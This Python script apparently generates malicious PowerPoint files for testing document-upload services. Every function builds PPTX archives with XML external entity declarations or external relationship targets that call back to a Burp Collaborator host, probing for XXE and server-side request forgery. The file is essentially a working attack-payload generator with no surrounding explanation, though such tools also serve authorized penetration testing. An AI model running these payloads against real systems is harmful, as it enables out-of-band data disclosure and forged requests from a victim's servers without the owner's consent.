from pathlib import Path
import zipfile
import tempfile

def generate_pptx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    
    pptx_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-1">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = xxe_dir / "xxe1_doctype.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe1_doctype)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_xxe2_parameter = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-pptx-2">
%xxe;
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = xxe_dir / "xxe2_parameter.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe2_parameter)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_ssrf1_http = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = ssrf_dir / "ssrf1_http.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="{base_url}/ssrf-pptx-1" TargetMode="External"/>
</Relationships>''')
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf1_http)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    pptx_ssrf2_https = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    output_file = ssrf_dir / "ssrf2_https.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="https://{burp_collab}/ssrf-pptx-2" TargetMode="External"/>
</Relationships>''')
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf2_https)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    master_file = output_dir / "master.pptx"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="{base_url}/ssrf-pptx-master" TargetMode="External"/>
</Relationships>''')
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe1_doctype)
        
        with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
